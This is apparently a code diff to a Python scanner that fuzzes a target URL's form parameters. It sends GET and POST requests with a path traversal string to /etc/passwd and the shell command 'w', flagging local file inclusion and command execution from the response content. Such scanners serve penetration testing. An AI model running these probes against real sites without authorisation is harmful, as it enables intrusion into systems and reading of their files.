@@ -4,12 +4,13 @@ import argparse
 import sys
 import requests
 import re
+import time
 from cores.colors import green, white, end, info, bad, good, run, yellow, bold
 from cores.utils import get_random_string,decode,encode
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-u',help='target url', dest='url')
-parser.add_argument('-w',help='wordlist path', dest='wordlist', default='./db/params.txt')
+parser.add_argument('-w',help='wordlist path', dest='wordlist', default='./db/short_params.txt')
 parser.add_argument('-b','--cookie',help='cookie', dest='cookie')
 args = parser.parse_args()
 
@@ -64,48 +65,82 @@ def parse(response):
             for name in names:
                 if name not in paramList:
                     paramList.append(name)
-                print("%s %s" % (green,name), end=",")
-        else:
-            print("%s No parameters found in webpage:" % bad)
+                print("%s%s %s" % (bold, green,name), end=",")
+    if not forms:
+        print("%s No parameters found in webpage:" % bad)
 
+def vulnerable(response, vuln):
+    if vuln == 'rce':
+        if 'tty' in response.lower():
+            return True
+        else:
+            return False
+    if vuln == 'lfi':
+        if 'root:' in response.lower():
+            return True
+        else:
+            return False
 
 def checkParams(response, url, headers):
+    breaker_rce = False
+    breaker_lfi = False
     values = ['../../../../../../../../etc/passwd', 'w']
     originalLength = len(response.text)
     # check for GET method
     print("\n%s Checking for GET request..." % good)
-    for param in paramList:
+    for index, param in enumerate(paramList):
+        if breaker_lfi and breaker_rce:
+            break
         for value in values:
             data = {param:value}
             response = requester(url=url, method='GET', data=data, headers=headers)
-            if len(response.text) != originalLength:
-                if value == 'w':
-                    print("%sFound valid param: %s %s%s(RCE!)"  % (green,param,bold,yellow))
-                    RCE = True
-                else:
-                    print("%sFound valid param: %s"  % (green,param))
-                    foundParams.insert(0, param)
-                    LFI = True
+            if len(response.text) != originalLength: # Found!
+                if value == 'w' and not breaker_rce: #  RCE Found
+                    if vulnerable(response.text, vuln="rce"):
+                        print("%s Found valid param: %s%s %s%s(RCE!)%s"  % (good, green,param,bold,yellow,end))
+                        foundParams.insert(0, param)
+                        breaker_rce = True
+                    else:
+                        print("%s Found valid param (This might be false positive): %s%s%s" % (info, green,param,end))
+                elif value != 'w' and not breaker_lfi: #LFI Found
+                    if vulnerable(response.text, vuln="lfi"):
+                        print("%s Found valid param: %s%s%s (%s?%s=%s)"  % (good,green,param,end,url,param,value))
+                        foundParams.insert(0, param)
+                        breaker_lfi = True
+                    else:
+                        print("%s Found valid param (This might be false positive): %s%s%s" % (info, green,param,end))
+        print("%s Trying: %s" % (info,param), end="\r", flush=True)
     
     # check for POST method
+    breaker_rce = False
+    breaker_lfi = False
     print("%s Checking for POST request..." % good)
     for param in paramList:
         for value in values:
             data = {param:value}
             response = requester(url=url, method='POST', data=data, headers=headers)
             if len(response.text) != originalLength:
-                if value == 'w':
-                    print("%sFound valid param: %s %s%s(RCE!)"  % (green,param,bold,yellow))
-                    RCE = True
-                else:
-                    print("%sFound valid param: %s"  % (green,param))
-                    foundParams.insert(0, param)
-                    LFI = True
+                if value == 'w' and not breaker_rce: #  RCE Found
+                    if vulnerable(response.text, vuln="rce"):
+                        print("%s Found valid param: %s%s %s%s(RCE!)%s"  % (good, green,param,bold,yellow,end))
+                        foundParams.insert(0, param)
+                        breaker_rce = True
+                    else:
+                        print("%s Found valid param %s%s(RCE!)%s (might be false positive): %s%s%s" % (info, bold,yellow,end, green,param,end))
+                elif value != 'w' and not breaker_lfi: #LFI Found
+                    if vulnerable(response.text, vuln="lfi"):
+                        print("%s Found valid param: %s%s%s (%s?%s=%s)"  % (good,green,param,end,url,param,value))
+                        foundParams.insert(0, param)
+                        breaker_lfi = True
+                    else:
+                        print("%s Found valid param (This might be false positive): %s%s%s" % (info, green,param,end))
+        print("%s Trying: %s" % (info,param), end="\r", flush=True)
     return foundParams
 
 if __name__ == "__main__":
     foundParams = []
     finalResult = []
+    bypassed_chars = []
     RCE = False
     LFI = False
     try:
@@ -118,11 +153,17 @@ if __name__ == "__main__":
                 print("%s Parsing webpage for potential parameters..." % good)
                 parse(response.text)
                 # lfi and rce checking
-                foundParams = checkParams(response, url, headers)
+                start_time = time.time() # Start execution time
+                checkParams(response, url, headers)
                 if not foundParams:
                     print("%s No parameter found, trying bypassing techniques..." % info)
+                    # bypassed_chars = checkParams()
+                else:
+                    print("%s Vulnerable parameters: "% good)
+                    for param in foundParams:
+                        print("%s " % param)
             except ConnectionError:
-                print("Unable to connect to the target URL")
+                print("%s Unable to connect to the target URL" % bad)
                 quit()
     except KeyboardInterrupt:
         print("\n%s Exiting..." % bad)
